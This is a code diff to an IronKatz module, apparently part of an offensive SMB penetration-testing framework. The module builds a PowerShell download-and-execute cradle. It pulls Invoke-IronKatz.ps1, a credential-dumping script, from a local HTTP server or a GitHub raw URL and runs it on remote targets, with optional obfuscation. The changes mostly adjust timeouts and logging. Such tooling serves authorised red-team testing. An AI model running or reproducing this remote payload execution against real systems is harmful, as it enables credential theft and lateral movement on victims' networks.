@@ -14,24 +14,32 @@ class IronKatz():
 
     def run(self, target, args, smb_con, loggers, config_obj):
         logger = loggers['console']
+        timeout = args.timeout
+        loggers['console'].info([smb_con.host, smb_con.ip, self.name.upper(), 'Attempting Invoke-Ironkatz'])
         try:
-            # Get script:
+            # Define Script Source
             if args.fileless:
                 srv_addr = get_local_ip()
                 script_location = 'http://{}/Invoke-Ironkatz.ps1'.format(srv_addr)
+                loggers['console'].warning([smb_con.host, smb_con.ip, self.name.upper(),'Fileless execution may take up to 60 seconds for file transfer'])
+                setattr(args, 'timeout', timeout + 65)
+                '''
+                "setattr(args, 'timeout', timeout+#)" Modifies the default timeout to allow for more execution time 
+                on the system. This is required since the file transfer over HTTP can take up to 25 seconds, especially
+                when using the  "--fileless" option. All execution method classes perform a sleep(self.timeout) before
+                retrieving the cmd output, therefore this timeout modification will also delay the results in the terminal.
+                '''
             else:
                 script_location = 'https://raw.githubusercontent.com/m8r0wn/OffensiveDLR/master/Invoke-IronKatz.ps1'
-            logger.debug('Fetching script from {}'.format(script_location))
+                setattr(args, 'timeout', timeout + 12)
+            logger.debug('Script source: {}'.format(script_location))
 
-            # Setup
-            timeout = args.timeout
-            setattr(args, 'timeout', timeout+10)       # Modify timeout to allow execution time
+            # Setup PS1 Script
             launcher = powershell.gen_ps_iex_cradle(script_location, '')
 
             try:
                 # Execute
                 cmd = powershell.create_ps_command(launcher, loggers['console'], force_ps32=args.force_ps32, obfs=args.obfs, server_os=smb_con.os)
-                loggers['console'].info([smb_con.host, smb_con.ip, self.name.upper(), 'Attempting Invoke-IronKatz'])
                 x = code_execution(smb_con, args, target, loggers, config_obj, cmd=cmd, return_data=True)
                 # Display Output
                 for line in x.splitlines():
